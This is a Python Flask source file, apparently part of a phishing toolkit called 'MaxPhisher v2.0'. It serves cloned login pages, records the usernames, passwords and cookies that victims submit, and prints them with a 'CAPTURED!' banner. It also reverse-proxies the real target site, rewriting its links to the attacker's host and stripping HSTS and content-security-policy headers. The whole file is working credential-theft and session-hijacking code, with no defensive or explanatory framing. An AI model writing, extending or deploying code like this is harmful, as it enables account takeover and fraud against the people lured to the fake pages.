import os, requests as req_lib
from flask import Flask, request, Response, redirect
from core.config import TEMPLATE_DIR, PORT, HOST
from core.capture import save
import urllib3, logging
urllib3.disable_warnings()
logging.getLogger("werkzeug").setLevel(logging.ERROR)

app = Flask(__name__, template_folder=TEMPLATE_DIR)
active_phishlet = None
TARGET_DOMAIN = ""

def set_phishlet(name, domain):
    global active_phishlet, TARGET_DOMAIN
    active_phishlet = name
    TARGET_DOMAIN = domain

@app.route("/", methods=["GET"])
def index():
    if not active_phishlet:
        return "<h1 style='color:#fff;text-align:center;margin-top:100px;font-family:monospace;background:#000;min-height:100vh;padding:50px'>MaxPhisher v2.0<br><span style='color:#888;font-size:14px'>No phishlet loaded</span></h1>"
    tpl = os.path.join(TEMPLATE_DIR, active_phishlet, "login.html")
    if os.path.exists(tpl):
        with open(tpl, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>Template not found</h1>"

@app.route("/login", methods=["POST"])
@app.route("/signin", methods=["POST"])
@app.route("/accounts/login/", methods=["POST"])
@app.route("/session", methods=["POST"])
@app.route("/api/login", methods=["POST"])
def capture():
    ip = request.remote_addr
    form = dict(request.form)
    save("credentials", TARGET_DOMAIN, form, ip)
    save("cookies", TARGET_DOMAIN, request.headers.get("Cookie", ""), ip)
    from colorama import Fore, Style
    print("\n" + Fore.RED + "  ╔" + "═"*50 + "╗")
    print("  " + Fore.RED + "║" + Fore.LIGHTRED_EX + "  🚨 CAPTURED!" + " "*34 + Fore.RED + "║")
    print("  " + Fore.RED + "╠" + "═"*50 + "╣")
    for k, v in form.items():
        print("  " + Fore.RED + "║" + Fore.WHITE + f"  {k}: {v}" + " "*(48-len(str(k))-len(str(v))) + Fore.RED + "║")
    print("  " + Fore.RED + "║" + Fore.CYAN + f"  IP: {ip}" + " "*(46-len(ip)) + Fore.RED + "║")
    print("  " + Fore.RED + "╚" + "═"*50 + "╝" + Style.RESET_ALL + "\n")
    if TARGET_DOMAIN:
        return redirect("https://" + TARGET_DOMAIN, code=302)
    return redirect("/", code=302)

@app.route("/<path:path>", methods=["GET", "POST"])
def proxy_all(path):
    if not TARGET_DOMAIN:
        return "No target", 404
    target_url = "https://" + TARGET_DOMAIN + "/" + path
    if request.query_string:
        target_url += "?" + request.query_string.decode()
    try:
        headers = {k: v for k, v in request.headers if k.lower() != "host"}
        headers["Host"] = TARGET_DOMAIN
        resp = req_lib.request(method=request.method, url=target_url,
            headers=headers, data=request.get_data(),
            cookies=request.cookies, allow_redirects=False, timeout=10, verify=False)
        body = resp.content
        try:
            text = body.decode("utf-8")
            our_host = request.host
            text = text.replace("https://" + TARGET_DOMAIN, "http://" + our_host)
            text = text.replace(TARGET_DOMAIN, our_host)
            body = text.encode("utf-8")
        except: pass
        excluded = ["content-encoding", "transfer-encoding", "strict-transport-security", "content-security-policy"]
        resp_headers = [(k, v) for k, v in resp.headers.items() if k.lower() not in excluded]
        return Response(body, status=resp.status_code, headers=resp_headers)
    except:
        return "Error", 502

def start_server(port=None):
    app.run(host=HOST, port=port or PORT, debug=False, use_reloader=False)
